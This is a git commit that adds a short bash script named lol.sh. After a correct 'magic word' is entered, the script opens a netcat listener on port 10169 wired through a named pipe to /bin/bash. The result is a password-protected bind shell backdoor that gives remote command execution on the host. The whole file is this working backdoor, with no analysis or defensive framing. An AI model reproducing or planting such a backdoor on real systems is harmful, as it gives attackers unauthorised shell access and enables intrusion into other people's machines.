dd7531c7b5a91f046a099e086754edf2b7a658e1
KekSec <isdrupter@users.noreply.github.com>
2016-07-31 18:01:45 -0400

    Create lol.sh

---
+++ lol.sh
@@ -0,0 +1,21 @@
+#!/bin/bash
+lolnode=/tmp/.rofl
+trap "rm -f /tmp/$lolnode /tmp/.pass" 1 2 8
+read -p "Enter the Magic Word:" magic
+printf $magic >/tmp/.pass
+hash="03fed5b990fbc2d64de9085ef9c66d24586b9380"
+
+if echo "$hash */tmp/.pass" | sha1sum -c - > /dev/null 2>&1 ; then
+  echo Access Granted!
+  echo 'Starting the server...'
+  mknod $lolnode p; (nc -l -p 10169 || nc -l 10169)0<$lolnode | \
+  /bin/bash >$lolnode 2>&1; rm $lolnode
+
+else 
+  for i in $(seq 1 5); do
+    echo "AH! AH! AH! You didn't say the magic word!"
+    sleep 1
+  done
+fi
+
+exit
